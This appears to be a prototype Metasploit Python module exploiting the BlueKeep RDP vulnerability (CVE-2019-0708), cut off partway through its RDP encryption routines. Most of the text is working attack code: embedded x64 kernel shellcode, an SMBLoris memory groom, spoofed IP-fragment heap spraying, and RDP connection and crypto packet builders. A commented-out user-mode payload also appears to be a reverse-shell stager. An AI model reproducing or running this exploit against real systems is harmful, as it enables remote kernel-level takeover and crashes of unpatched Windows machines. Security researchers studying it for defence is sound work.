#!/usr/bin/env python2.7

#
# Early rough draft frankenmodule prototype of BlueKeep... it's python because rapid7 is still developing the RDP library for Ruby.
#
# Slightly modified version since this tweet: https://twitter.com/zerosum0x0/status/1135866953996820480 
#
# Uses SMBLoris for the large eggs because I thought it would be funny to use a medium vuln to pwn a high-risk vuln, IP frags for the channel spray.
# I have since figured out a better RDP groom than both of these thanks to @ryHanson, however the IP frag spray is good for spraying other services and other vulns.
#
# This exploit is about 75% stable (BSoD risk) and not recommended. Needs better pre-call lock handling but I was burnt out atm. 
# Wait for the non-rough draft versions to acheive (presumably) near 100% reliability.
#
# Date: June 5, 2018
#

import sys
import socket
from base64 import b64decode
import os
import sys
import struct
import socket
import hashlib
from Crypto.Cipher import ARC4
import binascii
import time
import argparse

from metasploit import module

metadata = {
    'name': 'CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free',
    'description': '''
        You know what time it is!
    ''',
    'authors': [
        'zerosum0x0'  
    ],
    'references': [
        {'type': 'cve', 'ref': '2019-0708'},
        {'type': 'url', 'ref': 'https://github.com/zerosum0x0/CVE-2019-0708'}
    ],
    'date': 'May 14 2019',
    'type': 'remote_exploit',
    'rank': 'average',
    'privileged': True,
    'wfsdelay': 5,
    'targets': [
        {'platform': 'win', 'arch': 'x64'}
    ],
    'options': {
        'RHOST': {'type': 'address', 'description': 'Target server', 'required': True, 'default': None},
        'RPORT': {'type': 'port', 'description': 'Target server port', 'required': True, 'default': 3389},
        'HoldGroomTime': {'type': 'int', 'description': 'How many seconds to hold SMBLoris grooms open', 'required': True, 'default': 2}
    },
    'notes': {
        'AKA': ['BlueKeep']
    }
}


def hash(process):
    # calc_hash from eternalblue_kshellcode_x64.asm
    proc_hash = 0
    for c in str( process + "\x00" ):
        proc_hash  = ror( proc_hash, 13 )
        proc_hash += ord( c )
    return struct.pack('<I', proc_hash)

def ror( dword, bits ):
    return ( dword >> bits | dword << ( 32 - bits ) ) & 0xFFFFFFFF

# git clone https://github.com/worawit/MS17-010
# cd MS17-010/shellcode
# nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin
def eternalblue_kshellcode_x64(process="spoolsv.exe"):
    #proc_hash = hash(process)
    #kmode ='1\xc9A\xe2\x01\xc3\xb9\x82\x00\x00\xc0\x0f2H\xbbP\x03\x00\x10\x80\xfa\xff\xff\x89S\x04\x89\x03H\x8d\x05,\x00\x00\x00H\x89\xc2H\xc1\xea \x0f0L\x8d\x9c$\xb8\x00\x00\x001\xc0I\x8b[0I\x8bk@I\x8bsHL\x89\xdcA_A^A]A\\_\xc3\x0f\x01\xf8eH\x89$%\x10\x00\x00\x00eH\x8b$%\xa8\x01\x00\x00PSQRVWUAPAQARASATAUAVAWj+e\xff4%\x10\x00\x00\x00ASj3QL\x89\xd1H\x83\xec\x08UH\x81\xecX\x01\x00\x00H\x8d\xac$\x80\x00\x00\x00H\x89\x9d\xc0\x00\x00\x00H\x89\xbd\xc8\x00\x00\x00H\x89\xb5\xd0\x00\x00\x00H\xa1P\x03\x00\x10\x80\xfa\xff\xffH\x89\xc2H\xc1\xea H1\xdb\xff\xcbH!\xd8\xb9\x82\x00\x00\xc0\x0f0\xfb\xe88\x00\x00\x00\xfaeH\x8b$%\xa8\x01\x00\x00H\x83\xecxA_A^A]A\\A[AZAYAX]_^ZY[XeH\x8b$%\x10\x00\x00\x00\x0f\x01\xf8\xff$%P\x03\x00\x10VAWAVAUATSUH\x89\xe5f\x83\xe4\xf0H\x83\xec L\x8d5\xe3\xff\xff\xffeL\x8b<%8\x00\x00\x00M\x8b\x7f\x04I\xc1\xef\x0cI\xc1\xe7\x0cI\x81\xef\x00\x10\x00\x00I\x8b7f\x81\xfeMZu\xefA\xbb\\r\x11b\xe8\x18\x02\x00\x00H\x89\xc6H\x81\xc6\x08\x03\x00\x00A\xbbz\xba\xa30\xe8\x03\x02\x00\x00H\x89\xf1H9\xf0w\x11H\x8d\x90\x00\x05\x00\x00H9\xf2r\x05H)\xc6\xeb\x08H\x8b6H9\xceu\xe2I\x89\xf41\xdb\x89\xd9\x83\xc1\x04\x81\xf9\x00\x00\x01\x00\x0f\x8df\x01\x00\x00L\x89\xf2\x89\xcbA\xbbfU\xa2K\xe8\xbc\x01\x00\x00\x85\xc0u\xdbI\x8b\x0eA\xbb\xa3or-\xe8\xaa\x01\x00\x00H\x89\xc6\xe8P\x01\x00\x00A\x81\xf9\xbfw\x1f\xddu\xbcI\x8b\x1eM\x8dn\x10L\x89\xeaH\x89\xd9A\xbb\xe5$\x11\xdc\xe8\x81\x01\x00\x00j@h\x00\x10\x00\x00M\x8dN\x08I\xc7\x01\x00\x10\x00\x00M1\xc0L\x89\xf21\xc9H\x89\nH\xf7\xd1A\xbbK\xca\n\xeeH\x83\xec \xe8R\x01\x00\x00\x85\xc0\x0f\x85\xc8\x00\x00\x00I\x8b>H\x8d5\xe9\x00\x00\x001\xc9f\x03\r\xd7\x01\x00\x00f\x81\xc1\xf7\x00\xf3\xa4H\x89\xdeH\x81\xc6\x08\x03\x00\x00H\x89\xf1H\x8b\x11L)\xe2QRH\x89\xd1H\x83\xec A\xbb&@6\x9d\xe8\t\x01\x00\x00H\x83\xc4 ZYH\x85\xc0t\x18H\x8b\x80\xc8\x02\x00\x00H\x85\xc0t\x0cH\x83\xc2L\x8b\x02\x0f\xba\xe0\x05r\x05H\x8b\t\xeb\xbeH\x83\xeaLI\x89\xd41\xd2\x80\xc2\x901\xc9A\xbb&\xacP\x91\xe8\xc8\x00\x00\x00H\x89\xc1L\x8d\x89\x80\x00\x00\x00A\xc6\x01\xc3L\x89\xe2I\x89\xc4M1\xc0APj\x01I\x8b\x06PAPH\x83\xec A\xbb\xac\xceUK\xe8\x98\x00\x00\x001\xd2RRAXAYL\x89\xe1A\xbb\x188\t\x9e\xe8\x82\x00\x00\x00L\x89\xe9A\xbb"\xb7\xb3}\xe8t\x00\x00\x00H\x89\xd9A\xbb\r\xe2M\x85\xe8f\x00\x00\x00H\x89\xec][A\\A]A^A_^\xc3\xe9\xb5\x00\x00\x00M1\xc91\xc0\xacA\xc1\xc9\r<a|\x02, A\x01\xc18\xe0u\xec\xc31\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8b\x12H\x8brPH\x0f\xb7JJE1\xc91\xc0\xac<a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xeeE9\xd9u\xdaL\x8bz \xc3L\x89\xf8AQAPRQVH\x89\xc2\x8bB<H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0H\xff\xc9A\x8b4\x88H\x01\xd6\xe8x\xff\xff\xffE9\xd9u\xecXD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0^YZAXAYA[AS\xff\xe0VAWUH\x89\xe5H\x83\xec A\xbb\xda\x16\xaf\x92\xe8M\xff\xff\xff1\xc9QQQQAYL\x8d\x05\x18\x00\x00\x00ZH\x83\xec A\xbbFE\x1b"\xe8h\xff\xff\xffH\x89\xec]A_^\xc3'

    #os.system("/usr/bin/nasm /home/eternal/MS17-010/shellcode/bettershellcode.asm -o /home/eternal/MS17-010/shellcode/bettershellcode.o")
    #kmode = open("/home/eternal/MS17-010/shellcode/bettershellcode.o", "rb").read()
    #os.system("/usr/bin/nasm /home/eternal/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o /home/eternal/MS17-010/shellcode/eternalblue_kshellcode_x64.o")
    #kmode = open("/home/eternal/MS17-010/shellcode/eternalblue_kshellcode_x64.o", "rb").read()
    #os.system("/usr/bin/nasm /home/eternal/MS17-010/shellcode/benign.asm -o /home/eternal/MS17-010/shellcode/benign.o")
    #kmode = open("/home/eternal/MS17-010/shellcode/benign.o", "rb").read()

    return ('U\xe8b\x00\x00\x00\xb9\x82\x00\x00\xc0\x0f2L\x8d\rh\x00\x00\x00D9\xc8t\x199E\x00t\n\x89U\x04\x89E\x00\xc6E\xf8\x00I\x91PZH\xc1\xea \x0f0]eH\x8b\x04%\x88\x01\x00\x00f\x83\x80\xc4\x01\x00\x00\x01L\x8d\x9c$\xb8\x00\x00\x001\xc0I\x8b[0I\x8bk@I\x8bsHL\x89\xdcA_A^A]A\\_\xc3\xc3H\x8d-\x00\x10\x00\x00H\xc1\xed\x0cH\xc1\xe5\x0cH\x83\xedp\xc3\x0f\x01\xf8eH\x89$%\x10\x00\x00\x00eH\x8b$%\xa8\x01\x00\x00j+e\xff4%\x10\x00\x00\x00PPU\xe8\xc5\xff\xff\xffH\x8bE\x00H\x83\xc0\x1fH\x89D$\x10QRAPAQARAS1\xc0\xb2\x01\xf0\x0f\xb0U\xf8u\x14\xb9\x82\x00\x00\xc0\x8bE\x00\x8bU\x04\x0f0\xfb\xe8\x0e\x00\x00\x00\xfaA[AZAYAXZY]X\xc3AWAVWVSPL\x8b}\x00I\xc1\xef\x0cI\xc1\xe7\x0cI\x81\xef\x00\x10\x00\x00fA\x81?MZu\xf1L\x89}\x08eL\x8b4%\x88\x01\x00\x00\xbfx|\xf4\xdb\xe8\x01\x01\x00\x00H\x91\xbf?_dw\xe8\xfc\x00\x00\x00\x8b@\x03\x89\xc3=\x00\x04\x00\x00r\x03\x83\xc0\x10H\x8dP(L\x8d\x04\x11M\x89\xc1M\x8b\tM9\xc8\x0f\x84\xc6\x00\x00\x00L\x89\xc8L)\xf0H=\x00\x07\x00\x00w\xe6M)\xce\xbf\xe1\x14\x01\x17\xe8\xbb\x00\x00\x00\x8bx\x03\x83\xc7\x08H\x8d4\x19\xe8\xf4\x00\x00\x00=\xd8\x83\xe0>t\x10=\xd8\x83\xe0>t\tH\x8b\x0c9H)\xf9\xeb\xe0\xbfH\xb8\x18\xb8\xe8\x84\x00\x00\x00H\x89E\xf0H\x8d4\x11H\x89\xf3H\x8b[\x08H9\xdet\xf7J\x8d\x143\xbf>L\xf8\xce\xe8i\x00\x00\x00\x8b@\x03H\x83|\x02\xf8\x00t\xdeH\x8dM\x10M1\xc0L\x8d\r\xa9\x00\x00\x00Uj\x01UAPH\x83\xec \xbf\xc4\\\x19m\xe85\x00\x00\x00H\x8dM\x10M1\xc9\xbf4F\xcc\xaf\xe8$\x00\x00\x00H\x83\xc4@\x85\xc0t\xa3H\x8bE \x80x\x1a\x01t\tH\x89\x00H\x89@\x08\xeb\x90X[^_A^A_\xc3\xe8\x02\x00\x00\x00\xff\xe0SQVA\x8bG<A\x8b\x84\x07\x88\x00\x00\x00L\x01\xf8P\x8bH\x18\x8bX L\x01\xfb\xff\xc9\x8b4\x8bL\x01\xfe\xe8\x1f\x00\x00\x009\xf8u\xefX\x8bX$L\x01\xfbf\x8b\x0cK\x8bX\x1cL\x01\xfb\x8b\x04\x8bL\x01\xf8^Y[\xc3R1\xc0\x99\xac\xc1\xca\r\x01\xc2\x85\xc0u\xf6\x92Z\xc3USWVAWI\x8b(L\x8b}\x08R^L\x89\xcb1\xc0D\x0f"\xc0H\x89\x02\x89\xc1H\xf7\xd1I\x89\xc0\xb0@P\xc1\xe0\x06PI\x89\x01H\x83\xec \xbf\xea\x99nW\xe8e\xff\xff\xffH\x83\xc40\x85\xc0uEH\x8b>H\x8d5M\x00\x00\x00\xb9\x00\x06\x00\x00\xf3\xa4H\x8bE\xf0H\x8b@\x18H\x8b@ H\x8b\x00f\x83xH\x18u\xf6H\x8bPP\x81z\x0c3\x002\x00u\xe9L\x8bx \xbf^Q^\x83\xe8"\xff\xff\xffH\x89\x031\xc9\x88M\xf8\xb1\x01D\x0f"\xc1A_^_[]\xc3H\x921\xc9QQI\x89\xc9L\x8d\x05\r\x00\x00\x00\x89\xcaH\x83\xec \xff\xd0H\x83\xc40\xc3')


    #umode = '\xfcH\x83\xe4\xf0\xe8\xcc\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac<a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB<H\x01\xd0f\x81x\x18\x0b\x02\x0f\x85r\x00\x00\x00\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9K\xff\xff\xff]I\xbews2_32\x00\x00AVI\x89\xe6H\x81\xec\xa0\x01\x00\x00I\x89\xe5I\xbc\x02\x00#)\xc0\xa8\x01/ATI\x89\xe4L\x89\xf1A\xbaLw&\x07\xff\xd5L\x89\xeah\x01\x01\x00\x00YA\xba)\x80k\x00\xff\xd5j\nA^PPM1\xc9M1\xc0H\xff\xc0H\x89\xc2H\xff\xc0H\x89\xc1A\xba\xea\x0f\xdf\xe0\xff\xd5H\x89\xc7j\x10AXL\x89\xe2H\x89\xf9A\xba\x99\xa5ta\xff\xd5\x85\xc0t\nI\xff\xceu\xe5\xe8\x93\x00\x00\x00H\x83\xec\x10H\x89\xe2M1\xc9j\x04AXH\x89\xf9A\xba\x02\xd9\xc8_\xff\xd5\x83\xf8\x00~UH\x83\xc4 ^\x89\xf6j@AYh\x00\x10\x00\x00AXH\x89\xf2H1\xc9A\xbaX\xa4S\xe5\xff\xd5H\x89\xc3I\x89\xc7M1\xc9I\x89\xf0H\x89\xdaH\x89\xf9A\xba\x02\xd9\xc8_\xff\xd5\x83\xf8\x00}(XAWYh\x00@\x00\x00AXj\x00ZA\xba\x0b/\x0f0\xff\xd5WYA\xbaunMa\xff\xd5I\xff\xce\xe9<\xff\xff\xffH\x01\xc3H)\xc6H\x85\xf6u\xb4A\xff\xe7Xj\x00YI\xc7\xc2\xf0\xb5\xa2V\xff\xd5'

    #return kmode + struct.pack("<H", len(kmode)) + umode
    #return kmode + umode


# Keep a reference to a socket to make sure groom doesn't deallocate
def send_large_groom(rhost, rport, shellcode, desired_offset = 0xfffffa8010000350):
    sk = socket.socket()
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.connect((rhost, int(rport)))

    desired_gadget = struct.pack("<Q", desired_offset + 8)
    smb_header_len = 0x350


    payload = desired_gadget #"AABBCCDDEEFFGGHH"
    payload += shellcode
    payload += "\xcc" * (len(shellcode) - 0x300)  # 0x300 is enough for APC ring0->3
    payload += "\x90" * (0x1000 - (len(payload) + smb_header_len))

    pkt = '\x00\x01\xff\xff' # max NBSS header

    pkt += payload

    for i in range(0, 0x1f):
        pkt += "\x41" * smb_header_len
        pkt += payload

    sk.send(pkt)

    return sk

def make_packet(dest_ip, tcp_source, source_ip, tcp_dest, ip_id, chunk, desired_size = 0x8c):

    packet = '';
    # ip header fields
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0    # kernel will fill the correct total length
    ip_id = 0x4242#54321    #Id of this packet
    ip_frag_flags = 0x1
    ip_frag_off = chunk#0x8c

    #ip_frag_off = (ip_frag_flags | (ip_frag_off << 3)) & 0xffff
    ip_frag_off = 0x2000 | ip_frag_off

    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0    # kernel will fill the correct checksum
    ip_saddr = socket.inet_aton ( source_ip )    #Spoof the source ip address if you want to
    ip_daddr = socket.inet_aton ( dest_ip )

    ip_ihl_ver = (ip_ver << 4) + ip_ihl


    # the ! in the pack format string means network order
    ip_header = struct.pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    #print("%02x" % len(ip_header))
    filler = desired_size - len(ip_header)# - 0x18#- 0x2c

    pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
    #pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

    desired_address = 0xfffffa8010000350
    channel_struct = "" # we control 0x2c-0x8c
    channel_struct += pattern[0:8]
    channel_struct += "\x00" * 8
    channel_struct += pattern[16:176]
    channel_struct += struct.pack("<Q", desired_address)
    channel_struct += pattern[176+8:filler]
    #channel_struct += pattern[0:193]
    #channel_struct += "\x10\x00\xd0\xff\xff\xff\xff\xff"  # ffffffffffd00010  # crashing in nt!ExpCheckForIoPriorityBoost+e2
    ##channel_struct += pattern[201:224] # Unknown
    #channel_struct += "\x10\x00\xd0\xff\xff\xff\xff\xff" # ffffffffffd00010  # crashing in nt!ExpCheckForIoPriorityBoost+e2
    #channel_struct += pattern[232:filler] # Unknown
    # ffdff034  has a ptr to nt!KdVersionBlock
    return ip_header + channel_struct #pattern[0:36] + "\x00\x00\x00\x00" + pattern[40:filler] #"A" * filler


def flood_ip(s, dest_ip, dest_port, source_ip, amount, size = 0x8c):
    for x in range(0, amount):
        chunk = (x+1) * 0xff
        id = x#420

        amt = s.sendto(make_packet(dest_ip, 3389, source_ip, 4200, id, chunk, size), (dest_ip , 0 ))
        #print("SENT %d bytes" % (amt))

class Fragger():
    def __init__(self, target, port = 3389):
        try:
            self.target = target
            self.port = port
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except socket.error , msg:
            msfprint(args, "Couldn't create FRAG socket!", 'error')
            #print('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
            sys.exit()

    def frag_ip(self, source_ip, amount, size = 0x124):
        flood_ip(self.sock, self.target, self.port, source_ip, amount, size)

    def frag_range(self, start, end, amount, size = 0x124, prefix="192.168.1."):
        for ipn in range(start, end):
            ip = prefix + str(ipn)
            self.frag_ip(ip, amount, size)
        '''
        for x in range(0, 255):
            prefix = "192.168." + str(x) + "."
            for i in range(start, end):
                ip = prefix + str(i)
                self.frag_ip(ip, amount, size)
        '''


R = '\033[91m'  # red
W = '\033[0m'  # white

def parser_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for help")
    print(R + "Error: " + errmsg + W)
    sys.exit()


def parse_args():
    parser = argparse.ArgumentParser(epilog='\tExample: \r\npython ' + sys.argv[0] + " [options]")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('--host', help="target ip to scan for CVE-2019-0708 - BlueKeep")

    return parser.parse_args()

def error_msg(msg):
    print(R + "Error: " + msg + W)
    sys.exit()


def hexdump(src, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)




def check_rdp_vuln(username):
    x_224_conn_req = "\x03\x00\x00" + "{0}"                       # TPKT Header
    x_224_conn_req+=  chr(33+len(username))      # X.224: Length indicator
    x_224_conn_req+= "\xe0"                                  # X.224: Type - TPDU
    x_224_conn_req+= "\x00\x00"                              # X.224: Destination reference
    x_224_conn_req+= "\x00\x00"                              # X.224: Source reference
    x_224_conn_req+= "\x00"                                  # X.224: Class and options
    x_224_conn_req+= "\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d" # "Cookie: mstshash=
    x_224_conn_req+=  username                         # coookie value
    x_224_conn_req+= "\x0d\x0a"                              # Cookie terminator sequence
    x_224_conn_req+= "\x01"                                  # Type: RDP_NEG_REQ)
    x_224_conn_req+=  "\x00"                                 # RDP_NEG_REQ::flags
    x_224_conn_req+=  "\x08\x00"                             # RDP_NEG_REQ::length (8 bytes)
    x_224_conn_req+=  "\x00\x00\x00\x00"                     # Requested protocols (PROTOCOL_RDP)

    return x_224_conn_req

def pdu_connect_initial(hostname):
    host_name = ""
    for i in hostname:
        host_name+=struct.pack("<h",ord(i))
    host_name+= "\x00"*(32-len(host_name))

    mcs_gcc_request = ("\x03\x00\x01\xca" # TPKT Header
    "\x02\xf0\x80"             # x.224
    "\x7f\x65\x82\x01\xbe" # change here
    "\x04\x01\x01\x04"
    "\x01\x01\x01\x01\xff"
    "\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20"
    "\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02"
    "\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01\x4b" # chnage here
    "\x00\x05\x00\x14\x7c\x00\x01\x81\x42" # change here - ConnectPDU
    "\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34" # chnage here
    "\x01\xc0\xd8\x00\x04\x00\x08\x00\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00")


    mcs_gcc_request+= host_name # Client name -32 Bytes - we45-lt35

    mcs_gcc_request+=(
    "\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00"
    "\x03\xc0"
    "\x44\x00"
    "\x04\x00\x00\x00" #channel count
    "\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00" #cliprdr
    "\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00" #MS_T120
    "\x72\x64\x70\x73\x6e\x64\x00\x00\xc0\x00\x00\x00" #rdpsnd
    "\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00" #snddbg
    "\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00" #rdpdr
    )

    return mcs_gcc_request

def hex_str_conv(hex_str):
    hex_res = ""

    for i in bytearray(hex_str):
        hex_res+="\\x"
        hex_res+="%02x"%i

    return hex_res

def bin_to_hex(s):
    return s.encode("hex")

def bytes_to_bignum(bytesIn, order = "little"):

    if order == "little":
        bytesIn = bytesIn[::-1]

    bytes = bin_to_hex(bytesIn)
    s = "0x"+bytes
    return int(s,16)

def int_to_bytestring(daInt):
    hex_pkt = "%x"%daInt
    return binascii.unhexlify(hex_pkt)[::-1]


def rsa_encrypt(bignum, rsexp, rsmod):
    return (bignum ** rsexp) % rsmod

def rdp_rc4_crypt(rc4obj, data):
    return rc4obj.encrypt(data)


def rdp_parse_serverdata(pkt):
    ptr = 0
    rdp_pkt = pkt[0x49:]

    while ptr < len(rdp_pkt):
        header_type = rdp_pkt[ptr:ptr+2]
        header_length = struct.unpack("<h",rdp_pkt[ptr+2:ptr+4])[0]

        #print("- Header: {}  Len: {}".format(bin_to_hex(header_type),header_length))

        if header_type == "\x02\x0c":
            #print("- Security Header")
            # print("Header Length: {}".format(header_length))
            server_random = rdp_pkt[ptr+20:ptr+52]
            public_exponent = rdp_pkt[ptr+84:ptr+88]


            modulus = rdp_pkt[ptr+88:ptr+152]
            #print("- modulus_old: {}".format(bin_to_hex(modulus)))
            rsa_magic = rdp_pkt[ptr+68:ptr+72]

            if rsa_magic != "RSA1":
                print("Server cert isn't RSA, this scenario isn't supported (yet).")
                # sys.exit(1)

            #print("- RSA magic: {}".format(rsa_magic))
            bitlen = struct.unpack("<L",rdp_pkt[ptr+72:ptr+76])[0] - 8
            #print("- RSA bitlen: {}".format(bitlen))
            modulus = rdp_pkt[ptr+88:ptr+87+1+bitlen]
            #print("- modulus_new: {}".format(bin_to_hex(modulus)))

        ptr += header_length

    #print("- SERVER_MODULUS: {}".format(bin_to_hex(modulus)))
    #print("- SERVER_EXPONENT: {}".format(bin_to_hex(public_exponent)))
    #print("- SERVER_RANDOM: {}".format(bin_to_hex(server_random)))

    rsmod = bytes_to_bignum(modulus)
    rsexp = bytes_to_bignum(public_exponent)
    rsran = bytes_to_bignum(server_random)

    return rsmod, rsexp, rsran, server_random, bitlen



def pdu_channel_request(userid,channel):
    join_req = "\x03\x00\x00\x0c\x02\xf0\x80\x38"
    join_req+= struct.pack(">hh",userid,channel)
    return join_req


def mcs_erect_domain_pdu():
    mcs_erect_domain_pdu = "\x03\x00\x00\x0c\x02\xf0\x80\x04\x00\x01\x00\x01"
    return mcs_erect_domain_pdu

def msc_attach_user_pdu():
    msc_attach_user_pdu = "\x03\x00\x00\x08\x02\xf0\x80\x28"
    return msc_attach_user_pdu

def pdu_security_exchange(rcran, rsexp, rsmod, bitlen):
    encrypted_rcran_bignum = rsa_encrypt(rcran, rsexp, rsmod)
    encrypted_rcran = int_to_bytestring(encrypted_rcran_bignum)

    bitlen += 8
    bitlen_hex = struct.pack("<L",bitlen)

    #print("Encrypted client random: {}".format(bin_to_hex(encrypted_rcran)))

    userdata_length = 8 + bitlen
    userdata_length_low = userdata_length & 0xFF
    userdata_length_high = userdata_length / 256

    flags = 0x80 | userdata_length_high

    pkt = "\x03\x00"
    pkt+=struct.pack(">h",userdata_length+15) # TPKT
    pkt+="\x02\xf0\x80" # X.224
    pkt+="\x64" # sendDataRequest
    pkt+="\x00\x08" # intiator userId
    pkt+="\x03\xeb" # channelId = 1003
    pkt+="\x70" # dataPriority
    pkt+=struct.pack("h",flags)[0]
    pkt+=struct.pack("h",userdata_length_low)[0] # UserData length
    pkt+="\x01\x00" # securityHeader flags
    pkt+="\x00\x00" # securityHeader flagsHi
    pkt+= bitlen_hex # securityPkt length
    pkt+= encrypted_rcran # 64 bytes encrypted client random
    pkt+= "\x00\x00\x00\x00\x00\x00\x00\x00" # 8 bytes rear padding (always present)

    return pkt

def rdp_salted_hash(s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes):
    hash_sha1 = hashlib.new("sha1")
    hash_sha1.update(i_bytes)
    hash_sha1.update(s_bytes)
    hash_sha1.update(clientRandom_bytes)
    hash_sha1.update(serverRandom_bytes)

    hash_md5=hashlib.md5()
    hash_md5.update(s_bytes)
    hash_md5.update(binascii.unhexlify(hash_sha1.hexdigest()))

    return binascii.unhexlify(hash_md5.hexdigest())


def rdp_final_hash(k, clientRandom_bytes, serverRandom_bytes):
    md5 = hashlib.md5()

    md5.update(k)
    md5.update(clientRandom_bytes)
    md5.update(serverRandom_bytes)

    return binascii.unhexlify(md5.hexdigest())

def rdp_hmac(mac_salt_key, data_content):
    sha1 = hashlib.sha1()
    md5 =  hashlib.md5()

    pad1 = "\x36" * 40
    pad2 = "\x5c" * 48

    sha1.update(mac_salt_key)
    sha1.update(pad1)
    sha1.update(struct.pack('<L',len(data_content)))
    sha1.update(data_content)

    md5.update(mac_salt_key)
    md5.update(pad2)
    md5.update(binascii.unhexlify(sha1.hexdigest()))

    return binascii.unhexlify(md5.hexdigest())



def rdp_calculate_rc4_keys(client_random, server_random):

    preMasterSecret = client_random[0:24] + server_random[0:24]
